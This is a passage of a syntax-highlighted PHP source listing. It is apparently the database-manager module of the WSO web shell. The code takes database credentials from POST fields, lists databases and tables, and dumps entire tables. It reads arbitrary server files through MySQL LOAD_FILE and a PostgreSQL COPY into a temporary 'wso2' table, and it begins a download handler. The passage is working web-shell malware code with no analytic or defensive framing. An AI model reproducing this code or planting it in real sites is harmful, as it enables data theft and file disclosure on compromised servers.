<span class="lineno">1634</span>            <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
<span class="lineno">1635</span>        <span class="p">}</span>
<span class="lineno">1636</span>        <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">){</span>
<span class="lineno">1637</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1638</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1639</span>                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1640</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1641</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1642</span>                    <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span>
<span class="lineno">1643</span>                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">5432</span><span class="p">;</span>
<span class="lineno">1644</span>                    <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1645</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1646</span>            <span class="p">}</span>
<span class="lineno">1647</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1648</span>        <span class="p">}</span>
<span class="lineno">1649</span>        <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1650</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1651</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1652</span>                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1653</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1654</span>            <span class="p">}</span>
<span class="lineno">1655</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1656</span>        <span class="p">}</span>
<span class="lineno">1657</span>        <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1658</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1659</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1660</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1661</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1662</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1663</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1664</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1665</span>            <span class="p">}</span>
<span class="lineno">1666</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1667</span>        <span class="p">}</span>
<span class="lineno">1668</span>        <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1669</span>            <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span><span class="o">?</span><span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span><span class="p">;</span>
<span class="lineno">1670</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1671</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1672</span>                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1673</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1674</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1675</span>                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1676</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1677</span>            <span class="p">}</span>
<span class="lineno">1678</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1679</span>        <span class="p">}</span>
<span class="lineno">1680</span>        <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1681</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1682</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1683</span>                         <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SHOW databases&quot;</span><span class="p">);</span>
<span class="lineno">1684</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1685</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1686</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database WHERE datistemplate!=&#39;t&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1687</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1688</span>            <span class="p">}</span>
<span class="lineno">1689</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1690</span>        <span class="p">}</span>
<span class="lineno">1691</span>        <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1692</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1693</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1694</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span>
<span class="lineno">1695</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1696</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1697</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1698</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1699</span>            <span class="p">}</span>
<span class="lineno">1700</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1701</span>        <span class="p">}</span>
<span class="lineno">1702</span>        <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno">1703</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1704</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1705</span>                    <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">();</span>
<span class="lineno">1706</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1707</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1708</span>                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">();</span>
<span class="lineno">1709</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1710</span>            <span class="p">}</span>
<span class="lineno">1711</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1712</span>        <span class="p">}</span>
<span class="lineno">1713</span>        <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1714</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1715</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1716</span>                    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span>
<span class="lineno">1717</span>                        <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">);</span>
<span class="lineno">1718</span>                    <span class="k">else</span>
<span class="lineno">1719</span>                        <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1720</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1721</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1722</span>                    <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
<span class="lineno">1723</span>                    <span class="k">break</span><span class="p">;</span>
<span class="lineno">1724</span>            <span class="p">}</span>
<span class="lineno">1725</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1726</span>        <span class="p">}</span>
<span class="lineno">1727</span>        <span class="k">function</span> <span class="nf">loadFile</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1728</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1729</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1730</span>                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT LOAD_FILE(&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;) as file&quot;</span><span class="p">));</span>
<span class="lineno">1731</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1732</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1733</span>                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE wso2(file text);COPY wso2 FROM &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;select file from wso2;&quot;</span><span class="p">);</span>
<span class="lineno">1734</span>                    <span class="nv">$r</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
<span class="lineno">1735</span>                    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>
<span class="lineno">1736</span>                        <span class="nv">$r</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
<span class="lineno">1737</span>                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;drop table wso2&#39;</span><span class="p">);</span>
<span class="lineno">1738</span>                    <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
<span class="lineno">1739</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1740</span>            <span class="p">}</span>
<span class="lineno">1741</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1742</span>        <span class="p">}</span>
<span class="lineno">1743</span>        <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">,</span> <span class="nv">$fp</span> <span class="o">=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1744</span>            <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">type</span><span class="p">)</span>   <span class="p">{</span>
<span class="lineno">1745</span>                <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span>
<span class="lineno">1746</span>                    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
<span class="lineno">1747</span>                    <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
<span class="lineno">1748</span>                    <span class="nv">$sql</span> <span class="o">=</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1749</span>                     <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1750</span>                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span>
<span class="lineno">1751</span>                     <span class="nv">$head</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="lineno">1752</span>                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1753</span>                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1754</span>                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1755</span>                             <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span>
<span class="lineno">1756</span>                                 <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;NULL&quot;</span><span class="p">;</span>
<span class="lineno">1757</span>                             <span class="k">elseif</span><span class="p">(</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span>
<span class="lineno">1758</span>                                 <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span>
<span class="lineno">1759</span>                             <span class="k">else</span>
<span class="lineno">1760</span>                                 <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">1761</span>                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
<span class="lineno">1762</span>                        <span class="p">}</span>
<span class="lineno">1763</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$head</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1764</span>                             <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;) VALUES </span><span class="se">\n\t</span><span class="s2">(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="p">;</span>
<span class="lineno">1765</span>                             <span class="nv">$head</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1766</span>                         <span class="p">}</span> <span class="k">else</span>
<span class="lineno">1767</span>                             <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\n\t</span><span class="s2">,(&quot;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="p">;</span>
<span class="lineno">1768</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1769</span>                    <span class="p">}</span>
<span class="lineno">1770</span>                     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$head</span><span class="p">)</span>
<span class="lineno">1771</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1772</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1773</span>                <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span>
<span class="lineno">1774</span>                    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">);</span>
<span class="lineno">1775</span>                    <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1776</span>                        <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1777</span>                        <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1778</span>                            <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
<span class="lineno">1779</span>                            <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
<span class="lineno">1780</span>                        <span class="p">}</span>
<span class="lineno">1781</span>                         <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;INSERT INTO &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1782</span>                         <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">else</span> <span class="k">echo</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="lineno">1783</span>                    <span class="p">}</span>
<span class="lineno">1784</span>                <span class="k">break</span><span class="p">;</span>
<span class="lineno">1785</span>            <span class="p">}</span>
<span class="lineno">1786</span>            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno">1787</span>        <span class="p">}</span>
<span class="lineno">1788</span>    <span class="p">};</span>
<span class="lineno">1789</span>    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span>
<span class="lineno">1790</span>    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1791</span>        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1792</span>        <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span>
<span class="lineno">1793</span>         <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno">1794</span>             <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1795</span>             <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1796</span>             <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1797</span>             <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1798</span>             <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">1799</span>         <span class="p">}</span>
